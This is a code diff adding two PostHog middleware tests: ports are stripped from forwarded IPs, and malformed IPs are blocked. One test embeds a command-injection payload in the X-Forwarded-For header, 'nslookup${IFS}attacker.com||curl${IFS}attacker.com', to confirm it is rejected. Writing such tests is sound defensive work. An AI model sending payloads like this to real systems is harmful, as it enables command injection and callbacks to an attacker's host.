@@ -122,6 +122,35 @@ class TestAccessMiddleware(APIBaseTest):
                 response = self.client.get("/", REMOTE_ADDR="28.160.62.192", headers={"x-forwarded-for": ""})
                 self.assertNotIn(b"PostHog is not available", response.content)
 
+    def test_ip_with_port_stripped(self):
+        """IP addresses with ports should have the port stripped before validation."""
+        with self.settings(ALLOWED_IP_BLOCKS=["192.168.0.0/24"], USE_X_FORWARDED_HOST=True, TRUST_ALL_PROXIES=True):
+            # IPv4 with port
+            response = self.client.get("/", headers={"x-forwarded-for": "192.168.0.1:8080"})
+            self.assertNotIn(b"PostHog is not available", response.content)
+
+            # IPv6 with port (bracketed format)
+            response = self.client.get("/", headers={"x-forwarded-for": "[::1]:443"})
+            # ::1 is not in allowed blocks, so should be blocked
+            self.assertIn(b"PostHog is not available", response.content)
+
+    def test_malformed_ip_blocked(self):
+        """Malformed IPs and attack payloads should be blocked (fail closed)."""
+        with self.settings(ALLOWED_IP_BLOCKS=["0.0.0.0/0"], USE_X_FORWARDED_HOST=True, TRUST_ALL_PROXIES=True):
+            # Attack payload in XFF header
+            response = self.client.get(
+                "/", headers={"x-forwarded-for": "nslookup${IFS}attacker.com||curl${IFS}attacker.com"}
+            )
+            self.assertIn(b"PostHog is not available", response.content)
+
+            # Invalid IP format
+            response = self.client.get("/", headers={"x-forwarded-for": "not-an-ip"})
+            self.assertIn(b"PostHog is not available", response.content)
+
+            # Valid IP should work
+            response = self.client.get("/", headers={"x-forwarded-for": "192.168.1.1"})
+            self.assertNotIn(b"PostHog is not available", response.content)
+
 
 class TestAutoProjectMiddleware(APIBaseTest):
     # How many queries are made in the base app
